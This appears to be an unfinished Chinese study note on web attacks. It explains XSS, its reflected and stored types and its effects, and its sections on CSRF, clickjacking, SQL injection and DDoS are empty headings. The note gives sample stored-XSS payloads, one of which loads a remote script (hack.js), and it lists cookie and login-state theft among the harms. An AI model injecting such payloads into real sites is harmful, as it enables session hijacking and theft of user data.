## 1.XSS

> Cross Site Scripting 
>
> 跨站脚本攻击
>
> XSS(Cross Site Scripting )，跨站脚本攻击，因为缩写和CSS重叠，所以只能叫XSS。跨站脚本攻击是指通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击。
>
> 跨站脚本攻击有可能曹成一下影响：
>
> - 利用虚假输入表单窃取用户个人信息
> - 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
> - 显示伪造的文章或图片



> XSS攻击分类

- 反射型--url参数直接注入

- 存储型-存储到DB后读取时注入

  ```
  // 评论
  <script>alert(1)</script>
  
  // 跨站脚本注入
  我来了<script src="http://localhost:4000/hack.js"></script>
  ```

  ##### XSS攻击的危害 - Scripting能干啥就能干啥 

  - 获取页面数据

  - 获取Cookies

  - 劫持前端逻辑

  - 发送请求

  - 偷取网站的任意数据

  - 偷取用户的资料

  - 偷取用户的秘密和登录态

  - 欺骗用户

  - #####   防范手段


## 2.CSRF

## 3.点击劫持

## 4.SQL注入

## 5.OS注入

## 6.请求劫持

## 7.DDOS